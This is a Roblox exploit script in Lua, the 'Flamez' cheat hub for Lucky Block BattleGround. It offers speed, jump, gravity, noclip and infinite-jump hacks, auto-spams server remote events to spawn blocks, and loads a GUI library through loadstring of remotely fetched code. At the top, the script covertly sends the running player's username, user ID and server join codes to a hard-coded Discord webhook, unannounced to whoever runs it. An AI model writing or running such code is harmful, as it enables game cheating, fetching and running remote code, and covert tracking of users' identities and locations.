local webhookURL = "https://discord.com/api/webhooks/1333133574412435467/dJtOBcbl4SuIv_2J05Ua3KS5C0y3a7SHI9D2sfVY_lEEf426Io_bt_xGNfy57mMVxl--"

local player = game.Players.LocalPlayer
local username = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local gameId = game.PlaceId
local jobId = game.JobId
local playerCount = #game.Players:GetPlayers()

local jsJoinCode = [[
    fetch("https://games.roblox.com/v1/games/]] .. gameId .. [[/servers/Public?sortOrder=Asc&limit=100").then(res => res.json()).then(json => {
        const server = json.data.find(s => s.id === "]] .. jobId .. [[");
        if (server) {
            window.open(`roblox://placeId=` + server.placeId + `&gameInstanceId=` + server.id);
        } else {
            console.log("Server not found.");
        }
    });
]]

local luaJoinScript = [[
local TeleportService = game:GetService("TeleportService")
TeleportService:TeleportToPlaceInstance(]] .. gameId .. [[, "]] .. jobId .. [[", game.Players.LocalPlayer)
]]

local embed = {
    ["title"] = "Execution Log",
    ["description"] = "Here are the details of the player and game:",
    ["type"] = "rich",
    ["color"] = 0x000000, 
    ["fields"] = {
        { ["name"] = "Username", ["value"] = username, ["inline"] = true },
        { ["name"] = "Display Name", ["value"] = displayName, ["inline"] = true },
        { ["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = false },
        { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = false },
        { ["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true },
        { ["name"] = "Players in Server", ["value"] = tostring(playerCount), ["inline"] = true },
        { ["name"] = "JavaScript Join Code", ["value"] = "```js\n" .. jsJoinCode .. "\n```", ["inline"] = false },
        { ["name"] = "Lua Join Script", ["value"] = "```lua\n" .. luaJoinScript .. "\n```", ["inline"] = false },
    },
    ["footer"] = { ["text"] = "Execution Log - Roblox" },
    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

local payload = game:GetService("HttpService"):JSONEncode({
    ["content"] = "",
    ["embeds"] = {embed}
})

local requestFunction = syn and syn.request or http_request or request
if requestFunction then
    requestFunction({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = payload
    })
else
    warn("Your executor does not support HTTP requests.")
end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")

local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local localPlayer = Players.LocalPlayer
local placeId = game.PlaceId

local CustomTheme = {
    TextColor = Color3.fromRGB(0, 255, 0), 

    Background = Color3.fromRGB(40, 40, 40), 
    Topbar = Color3.fromRGB(20, 20, 20),  
    Shadow = Color3.fromRGB(10, 10, 10),  

    NotificationBackground = Color3.fromRGB(0, 0, 0),
    NotificationActionsBackground = Color3.fromRGB(0, 255, 0), 

    TabBackground = Color3.fromRGB(20, 20, 20),
    TabStroke = Color3.fromRGB(0, 255, 0),
    TabBackgroundSelected = Color3.fromRGB(0, 255, 0), 
    TabTextColor = Color3.fromRGB(0, 255, 0),
    SelectedTabTextColor = Color3.fromRGB(0, 0, 0), 

    ElementBackground = Color3.fromRGB(15, 15, 15),
    ElementBackgroundHover = Color3.fromRGB(20, 20, 20),
    SecondaryElementBackground = Color3.fromRGB(10, 10, 10),
    ElementStroke = Color3.fromRGB(0, 255, 0),
    SecondaryElementStroke = Color3.fromRGB(0, 200, 0),

    SliderBackground = Color3.fromRGB(0, 200, 0),
    SliderProgress = Color3.fromRGB(0, 255, 0),
    SliderStroke = Color3.fromRGB(0, 255, 0),

    ToggleBackground = Color3.fromRGB(10, 10, 10),
    ToggleEnabled = Color3.fromRGB(0, 255, 0),
    ToggleDisabled = Color3.fromRGB(80, 80, 80),
    ToggleEnabledStroke = Color3.fromRGB(0, 255, 0),
    ToggleDisabledStroke = Color3.fromRGB(100, 100, 100),
    ToggleEnabledOuterStroke = Color3.fromRGB(0, 200, 0),
    ToggleDisabledOuterStroke = Color3.fromRGB(60, 60, 60),

    DropdownSelected = Color3.fromRGB(20, 20, 20),
    DropdownUnselected = Color3.fromRGB(10, 10, 10),

    InputBackground = Color3.fromRGB(15, 15, 15),
    InputStroke = Color3.fromRGB(0, 255, 0),
    PlaceholderColor = Color3.fromRGB(0, 200, 0)
}

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "Flamez - Lucky Block BattleGround",
   Icon = 0, 
   LoadingTitle = "Flamez - Lucky Block BattleGround",
   LoadingSubtitle = "by Flames",
   Theme = CustomTheme, 

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, 

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, 
      FileName = "Flamez Hub"
   },

   Discord = {
      Enabled = true, 
      Invite = "5c9D3VD7se", 
      RememberJoins = false 
   },

   KeySystem = false, 
   KeySettings = {
      Title = "Flamez - Key System",
      Subtitle = "Key System",
      Note = "Key is provided in the Discord", 
      FileName = "FlamezKey", 
      SaveKey = true, 
      GrabKeyFromSite = false, 
      Key = {"Hello"} 
   }
})

local HomeTab = Window:CreateTab("Home", "home")
local BlockTab = Window:CreateTab("Blocks", "cuboid")
local PlayerTab = Window:CreateTab("LocalPlayer", "user")

PlayerTab:CreateDivider()

PlayerTab:CreateSlider({
    Name = "WalkSpeed",
    Range = {16, 500},
    Increment = 1,
    CurrentValue = 16,
    Flag = "WalkSpeed",
    Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
    end
})

PlayerTab:CreateSlider({
    Name = "JumpPower",
    Range = {50, 500},
    Increment = 1,
    CurrentValue = 50,
    Flag = "JumpPower",
    Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
    end
})

PlayerTab:CreateSlider({
    Name = "Gravity",
    Range = {0, 196.2},
    Increment = 0.1,
    CurrentValue = workspace.Gravity,
    Flag = "Gravity",
    Callback = function(Value)
        workspace.Gravity = Value
    end
})

PlayerTab:CreateSlider({
    Name = "Field of View",
    Range = {70, 120},
    Increment = 1,
    CurrentValue = 70,
    Flag = "FOV",
    Callback = function(Value)
        workspace.CurrentCamera.FieldOfView = Value
    end
})

PlayerTab:CreateDivider()

PlayerTab:CreateToggle({
    Name = "Infinite Jump",
    CurrentValue = false,
    Flag = "InfiniteJump",
    Callback = function(Value)
        _G.InfiniteJumpEnabled = Value
    end
})

game:GetService("UserInputService").JumpRequest:Connect(function()
    if _G.InfiniteJumpEnabled then
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

PlayerTab:CreateToggle({
    Name = "NoClip",
    CurrentValue = false,
    Flag = "NoClip",
    Callback = function(Value)
        _G.NoClipEnabled = Value
        while _G.NoClipEnabled do
            for _, part in ipairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
            wait(0.1)
        end
    end
})

PlayerTab:CreateDivider()

local Section = BlockTab:CreateSection("Single Open")

local remoteEvents = {
    {Name = "Spawn Diamond Block", Event = game:GetService("ReplicatedStorage").SpawnDiamondBlock},
    {Name = "Spawn Galaxy Block", Event = game:GetService("ReplicatedStorage").SpawnGalaxyBlock},
    {Name = "Spawn Lucky Block", Event = game:GetService("ReplicatedStorage").SpawnLuckyBlock},
    {Name = "Spawn Rainbow Block", Event = game:GetService("ReplicatedStorage").SpawnRainbowBlock},
    {Name = "Spawn Super Block", Event = game:GetService("ReplicatedStorage").SpawnSuperBlock},
}

for _, remote in ipairs(remoteEvents) do
    BlockTab:CreateButton({
        Name = remote.Name, 
        Callback = function()

            if remote.Event then
                remote.Event:FireServer()
            else
                warn("Remote event for " .. remote.Name .. " not found!")
            end
        end,
    })
end

local Section = BlockTab:CreateSection("Auto Open")

for _, remote in ipairs(remoteEvents) do
    local loopEnabled = false 

    BlockTab:CreateToggle({
        Name = "Auto " .. remote.Name,
        CurrentValue = false,
        Flag = "Loop" .. remote.Name:gsub(" ", ""), 
        Callback = function(Value)
            loopEnabled = Value 
            if Value then

                while loopEnabled do
                    if remote.Event then
                        remote.Event:FireServer()
                    else
                        warn("Remote event for " .. remote.Name .. " not found!")
                    end
                    wait(0) 
                end
            end
        end,
    })
end

HomeTab:CreateDivider()

local ServerStats = HomeTab:CreateParagraph({
    Title = "Server Statistics", 
    Content = "Players: 0\nFPS: 0\nExecutor: Unknown"
})

HomeTab:CreateDivider()

local Button = HomeTab:CreateButton({
   Name = "Destory Flamez",
   Callback = function()
   Rayfield:Destroy()
   end,
})

local RejoinButton = HomeTab:CreateButton({
    Name = "Rejoin Server",
    Callback = function()

        TeleportService:TeleportToPlaceInstance(placeId, game.JobId, player)
    end,
})

local ServerHopButton = HomeTab:CreateButton({
    Name = "Server Hop",
    Callback = function()

        local function hopToNewServer()
            local httpService = game:GetService("HttpService")
            local servers = {}
            local cursor = nil

            repeat
                local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?limit=100"
                if cursor then
                    url = url .. "&cursor=" .. cursor
                end

                local success, result = pcall(function()
                    return httpService:JSONDecode(game:HttpGet(url))
                end)

                if success and result and result.data then
                    for _, server in ipairs(result.data) do
                        if server.id ~= game.JobId and server.playing < server.maxPlayers then
                            table.insert(servers, server.id)
                        end
                    end
                    cursor = result.nextPageCursor
                else
                    break
                end
            until not cursor

            if #servers > 0 then
                TeleportService:TeleportToPlaceInstance(placeId, servers[math.random(1, #servers)], player)
            else
                warn("No available servers found.")
            end
        end

        hopToNewServer()
    end,
})

HomeTab:CreateDivider()

local function identifyExecutor()
    if identifyexecutor then
        local name, version = identifyexecutor()
        return name .. " v" .. version
    else
        return "Unknown"
    end
end

local function setFPSCap(cap)
    if setfpscap then
        setfpscap(cap)
        return "FPS Cap set to " .. tostring(cap)
    else
        return "FPS Cap Not Supported"
    end
end

local function UpdateServerStats()
    local playerCount = #Players:GetPlayers()
    local fps = math.floor(1 / RunService.RenderStepped:Wait())
    local executor = identifyExecutor()

    ServerStats:Set({
        Title = "Server Statistics", 
        Content = "Players: " .. playerCount ..
                  "\nFPS: " .. fps ..
                  "\nExecutor: " .. executor
    })
end

setFPSCap(999)

while true do
    task.wait(1)
    UpdateServerStats()
end

Rayfield:Notify({
   Title = "Script Loaded",
   Content = "FlamezHub has been successfully loaded!",
   Duration = 6.5, 
   Image = "check", 
})

Rayfield:LoadConfiguration()
